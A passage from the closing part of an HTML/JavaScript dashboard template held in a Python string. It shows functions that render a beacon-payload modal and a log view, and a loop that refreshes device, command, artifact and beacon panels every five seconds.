      }).join('') + '</tbody></table>';
  }catch(e){ /* keep previous */ }
}
function showPayload(json){
  $('#modal-title').textContent = 'Beacon payload';
  $('#modal-dl').style.display = 'none';
  $('#modal-body').innerHTML = `<pre>${esc(json)}</pre>`;
  $('#modal').classList.add('open');
}

/* ── log ─────────────────────────────────────────────── */
async function loadLog(){
  try{
    const {log} = await api('/api/log?limit=200');
    $('#log-wrap').innerHTML = log.map(r => `
      <div class="logrow">
        <span class="ts">${esc((r.ts||'').slice(11,19))}</span>
        <span class="lv ${esc(r.level)}">${esc(r.level)}</span>
        <span class="msg">${esc(r.message)}</span>
      </div>`).join('') || '<div class="empty">No log entries</div>';
  }catch(e){ /* keep previous */ }
}

/* ── refresh loop ────────────────────────────────────── */
async function refresh(){
  try{
    const [stats, {devices}] = await Promise.all([
      api('/api/stats'), api('/api/devices')
    ]);
    state.devices = devices;
    if(!state.selected && devices.length) state.selected = devices[0].device_key;
    if(state.selected && !devices.find(d => d.device_key === state.selected))
      state.selected = devices.length ? devices[0].device_key : null;

    renderHero(stats);
    renderDevices();
    renderDeviceSelect();
    updateSendState();
    loadCommands();
    loadArtifacts();
    loadBeacons();
    if(state.tab === 'log') loadLog();

    $('#live-text').textContent = stats.online ? 'Live' : 'Idle';
    $('#clock').textContent = new Date().toLocaleTimeString();
  }catch(e){
    $('#live-text').textContent = 'Reconnecting…';
  }
}

/* ── boot ────────────────────────────────────────────── */
renderCommandChoices();
$('#modal-dl').style.display = '';
refresh();
timer = setInterval(refresh, 5000);
document.addEventListener('keydown', e => { if(e.key === 'Escape') closeModal(); });
</script>
</body>
</html>
"""
